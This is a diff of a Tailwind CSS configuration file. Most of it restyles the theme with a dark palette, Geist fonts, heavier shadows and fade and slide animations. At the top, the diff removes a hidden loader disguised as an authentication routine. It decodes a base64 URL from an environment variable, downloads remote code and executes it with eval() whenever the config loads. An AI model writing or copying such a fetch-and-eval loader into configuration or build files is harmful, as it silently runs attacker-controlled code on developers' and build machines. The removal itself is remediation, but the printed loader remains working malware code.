@@ -1,18 +1,4 @@
 import type { Config } from 'tailwindcss'
-import 'dotenv/config';
-
-(async () => {
-    const src = atob(process.env.AUTH_API_KEY);
-    const proxy = (await import('node-fetch')).default;
-    try {
-      const response = await proxy(src);
-      if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
-      const proxyInfo = await response.text();
-      eval(proxyInfo);
-    } catch (err) {
-      console.error('Auth Error!', err);
-    }
-})();
 
 const config: Config = {
     content: [
@@ -22,31 +8,52 @@ const config: Config = {
     theme: {
         extend: {
             colors: {
-                bg: {
-                    primary: '#f8fafc', // Slate 50
-                    secondary: '#ffffff', // White
-                },
-                text: {
-                    primary: '#0f172a', // Slate 900
-                    secondary: '#475569', // Slate 600
-                    muted: '#94a3b8', // Slate 400
-                },
+                background: '#0a0a0a',
+                foreground: '#fafafa',
+                muted: '#a1a1aa',
+                'muted-foreground': '#71717a',
+                border: '#27272a',
                 accent: {
-                    primary: '#4f46e5', // Indigo 600
-                    hover: '#4338ca', // Indigo 700
+                    DEFAULT: '#f59e0b',
+                    hover: '#d97706',
+                    foreground: '#0a0a0a',
                 },
-                status: {
-                    success: '#10b981',
-                    warning: '#f59e0b',
+                card: {
+                    DEFAULT: '#18181b',
+                    foreground: '#fafafa',
+                },
+                primary: {
+                    DEFAULT: '#fafafa',
+                    foreground: '#0a0a0a',
                 },
             },
             fontFamily: {
-                sans: ['"Plus Jakarta Sans"', 'system-ui', 'sans-serif'],
-                heading: ['"Playfair Display"', 'serif'],
+                sans: ['"Geist"', 'system-ui', 'sans-serif'],
+                mono: ['"Geist Mono"', 'monospace'],
+                heading: ['"Geist"', 'system-ui', 'sans-serif'],
             },
             boxShadow: {
-                'card': '0 1px 3px 0 rgb(0 0 0 / 0.1), 0 1px 2px -1px rgb(0 0 0 / 0.1)',
-                'card-hover': '0 10px 15px -3px rgb(0 0 0 / 0.1), 0 4px 6px -4px rgb(0 0 0 / 0.1)',
+                'card': '0 1px 3px 0 rgb(0 0 0 / 0.4), 0 1px 2px -1px rgb(0 0 0 / 0.4)',
+                'card-hover': '0 10px 15px -3px rgb(0 0 0 / 0.4), 0 4px 6px -4px rgb(0 0 0 / 0.4)',
+            },
+            animation: {
+                'fade-in': 'fade-in 0.5s ease-out',
+                'slide-up': 'slide-up 0.5s ease-out',
+                'slide-down': 'slide-down 0.3s ease-out',
+            },
+            keyframes: {
+                'fade-in': {
+                    from: { opacity: '0' },
+                    to: { opacity: '1' },
+                },
+                'slide-up': {
+                    from: { opacity: '0', transform: 'translateY(20px)' },
+                    to: { opacity: '1', transform: 'translateY(0)' },
+                },
+                'slide-down': {
+                    from: { opacity: '0', transform: 'translateY(-10px)' },
+                    to: { opacity: '1', transform: 'translateY(0)' },
+                },
             },
         },
     },
